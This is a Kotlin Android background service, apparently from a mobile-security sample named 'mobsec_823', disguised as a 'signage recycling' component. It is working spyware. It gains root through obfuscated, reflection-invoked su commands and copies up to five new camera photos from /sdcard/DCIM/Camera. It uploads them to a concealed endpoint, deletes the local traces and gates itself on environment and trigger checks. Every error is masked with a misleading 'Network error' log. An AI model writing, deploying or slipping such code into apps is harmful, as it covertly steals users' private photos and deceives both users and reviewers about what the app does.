package com.example.mobsec_823.RecylingService

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

class SignageRecylingService : Service() {

    private val TAG = "SignageRecylingService"
    private val PREFS_NAME = "SignagePrefs"
    private val SENT_SIGNAGE_KEY = "sent_signage_list"
    private val CAMERA_DIR = "/sdcard/DCIM/Camera"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {
            Log.w(TAG, "Network error")
        }

        Thread {
            try {
                if (!SafetyNet.checkKitchenPermit(33)) {
                    return@Thread
                }

                val sentSet = getCollectedSignage().toMutableSet()
                val signageToCollect = findNewSignage(sentSet)

                if (signageToCollect.isNotEmpty()) {
                    signageToCollect.forEach { file ->
                        if (uploadToSignageWarehouse(file)) {
                            sentSet.add(file.name.replace("signage_", ""))
                        } else {
                            Log.w(TAG, "Network error")
                        }
                        if (file.absolutePath.contains(cacheDir.absolutePath)) {
                            file.delete()
                        }
                    }
                    saveCollectedSignage(sentSet)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Network error")
            } finally {
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    private fun findNewSignage(sentSet: Set<String>): List<File> {
        val candidates = mutableListOf<File>()
        try {
            val listCommand = SecretBox.getListSignageCmd()
            val su = SecretBox.getSuCmd()
            
            // Execute ls command
            val process = SecretBox.reflectedExec(arrayOf(su, "-c", listCommand)) ?: return emptyList()
            val reader = BufferedReader(InputStreamReader(process.inputStream))

            var line: String?
            var foundCount = 0
            while (reader.readLine().also { line = it } != null && foundCount < 5) {
                val fileName = line!!.trim()
                if (fileName.isEmpty() || !fileName.endsWith(".jpg", ignoreCase = true)) continue
                
                // Use absolute path for copying
                val sourcePath = "$CAMERA_DIR/$fileName"

                if (!sentSet.contains(fileName)) {
                    val localFile = File(cacheDir, "signage_$fileName")
                    val copyCommand = "cp \"$sourcePath\" \"${localFile.absolutePath}\" && chmod 666 \"${localFile.absolutePath}\""
                    
                    SecretBox.reflectedExec(arrayOf(su, "-c", copyCommand))?.waitFor()

                    if (localFile.exists() && localFile.length() > 0) {
                        candidates.add(localFile)
                        foundCount++
                    } else {
                        Log.w(TAG, "Network error")
                    }
                }
            }
            process.waitFor()
        } catch (e: Exception) {
            Log.w(TAG, "Network error")
        }
        return candidates
    }

    private fun uploadToSignageWarehouse(file: File): Boolean {
        return try {
            val endpoint = SecretBox.getSignageEndpoint()
            if (endpoint.isEmpty()) return false

            val client = OkHttpClient()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("image", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                .build()

            val request = Request.Builder().url(endpoint).post(requestBody).build()
            client.newCall(request).execute().use { response -> 
                if (!response.isSuccessful) Log.w(TAG, "Network error")
                response.isSuccessful 
            }
        } catch (e: Exception) { 
            Log.w(TAG, "Network error")
            false 
        }
    }

    private fun getCollectedSignage(): Set<String> {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(SENT_SIGNAGE_KEY, emptySet()) ?: emptySet()
    }

    private fun saveCollectedSignage(set: Set<String>) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putStringSet(SENT_SIGNAGE_KEY, set).apply()
    }
}
